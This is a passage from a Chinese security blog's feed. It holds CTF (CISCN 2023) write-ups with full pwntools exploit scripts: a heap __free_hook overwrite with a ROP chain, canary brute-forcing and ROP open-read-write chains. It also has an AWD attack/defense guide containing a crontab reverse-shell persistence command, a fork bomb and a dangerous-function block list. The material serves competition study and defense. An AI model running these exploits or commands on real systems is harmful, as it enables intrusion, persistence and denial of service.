class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shell-We-Go"><a href="#Shell-We-Go" class="headerlink" title="Shell We Go"></a>Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p><p>导出密文后异或得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-reverse-babyre.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;签到卡&quot;&gt;&lt;a href=&quot;#签到卡&quot; class=&quot;headerlink&quot; title=&quot;签到卡&quot;&gt;&lt;/a&gt;签到</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.lewiserii.top/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>python反序列化</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</id>
    <published>2023-05-25T01:00:00.000Z</published>
    <updated>2023-05-25T01:15:25.086Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4415af594e9c21a7589996feb038f01d1e61bf7e7195157852ca3073ed29082c">c37edc3dc388221caed397fda20028d383bad53d282121946cc4fe32663762cf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="python" scheme="https://www.lewiserii.top/tags/python/"/>
    
    <category term="反序列化" scheme="https://www.lewiserii.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ssti学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssti%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssti%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-05-25T00:00:00.000Z</published>
    <updated>2023-05-25T01:15:46.712Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4415af594e9c21a7589996feb038f01d1e61bf7e7195157852ca3073ed29082c">c37edc3dc388221caed397fda20028d383bad53d282121946cc4fe32663762cf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="python" scheme="https://www.lewiserii.top/tags/python/"/>
    
    <category term="ssti" scheme="https://www.lewiserii.top/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻击与防御</title>
    <link href="https://www.lewiserii.top/awd/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html"/>
    <id>https://www.lewiserii.top/awd/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html</id>
    <published>2023-05-21T12:00:00.000Z</published>
    <updated>2023-06-10T12:48:34.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口</p><p>用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>ssh弱口令</strong><br>可能会有些队伍没有改</p><p><strong>web弱口令</strong><br>一般在后台登录处，或者phpmyadmin之类的服务</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复</p><p><strong>预留后门</strong><br>某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机</p><p><strong>其他漏洞</strong></p><p>将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>不死马</strong></p><p>参考文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p><strong>内核漏洞提权</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure><p><strong>crontab写定时任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//每分钟反弹shell到 127.0.0.1的5353端口<br>(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure><h2 id="搅屎"><a href="#搅屎" class="headerlink" title="搅屎"></a>搅屎</h2><p>1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作</p><p>2：fork炸弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="web防御"><a href="#web防御" class="headerlink" title="web防御"></a>web防御</h2><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>ssh命令登录或者使用图形化工具连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//ssh连接<br>ssh -p 2222 ctf@xx.xx.xx.xx<br><br>//免密登录<br>ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx<br></code></pre></td></tr></table></figure><h4 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h4><p>比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##网址备份</span><br>tar -zcvf web.tar.gz /var/www/html<br><br><span class="hljs-comment">##数据库备份-全部数据</span><br>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库备份-指定数据库和表</span><br>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库恢复（mysql终端下执行）</span><br><span class="hljs-built_in">source</span> /tmp/db.sql<br></code></pre></td></tr></table></figure><h4 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h4><p><strong>ssh密码</strong><br>如果发现拿到的ssh密码不是类似于<code>SDs2dKJaH5hs</code>的随机强口令，而是类似于<code>ctf/123456</code>，则需要更改ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure><p><strong>web后台密码</strong><br>一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改</p><p><strong>mysql密码</strong><br>mysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##方法一（mysql终端下执行）</span><br>show databases;<br>use mysql<br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost = password(<span class="hljs-string">&#x27;123&#x27;</span>);<br><br><span class="hljs-comment">##方法二（mysql终端下执行）</span><br>update user <span class="hljs-built_in">set</span> password = PASSWORD(<span class="hljs-string">&#x27;需要更换的密码&#x27;</span>) <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush privileges;<br>show tables;<br><br><span class="hljs-comment">##方法三</span><br>mysqladmin -u用户名 -p旧密码 password 新密码<br></code></pre></td></tr></table></figure><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等</p><p>找到漏洞后根据漏洞的种类进行修复</p><p>1：删站<br>不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势</p><p>2：删页面<br>只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等</p><p>3：破坏正常功能<br>如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效</p><p>4：正常修补手段<br>如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">;禁用危险函数<br>disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo<br><br>;预防sql注入<br>magic_quotes_gpc = on<br><br>;远程文件包含<br>allow_url_fopen = off<br>allow_url_include = off<br><br>;重启php服务<br>service php-fpm restart<br></code></pre></td></tr></table></figure><h4 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h4><p>waf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用</p><p>几个waf项目</p><p>1：AoiAWD<br>安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等<br>地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p><p>2：watchbird<br>通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞<br>地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p><h4 id="shell查杀"><a href="#shell查杀" class="headerlink" title="shell查杀"></a>shell查杀</h4><p>对于不死马可以参考我以前写的一篇文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p>一些find命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##寻找最近20分钟修改过的文件</span><br>find /var/www/html -name *.php -mmin -20<br><br><span class="hljs-comment">##寻找行数最短的文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-built_in">wc</span> -l | <span class="hljs-built_in">sort</span> -rg<br><br><span class="hljs-comment">##关键字查杀</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br></code></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -nlpt<br>ps -<span class="hljs-built_in">df</span><br>top<br></code></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 PID<br>killall 名称<br></code></pre></td></tr></table></figure><h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p>经过实践，发现别名似乎在网站上rce执行命令时并不会生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 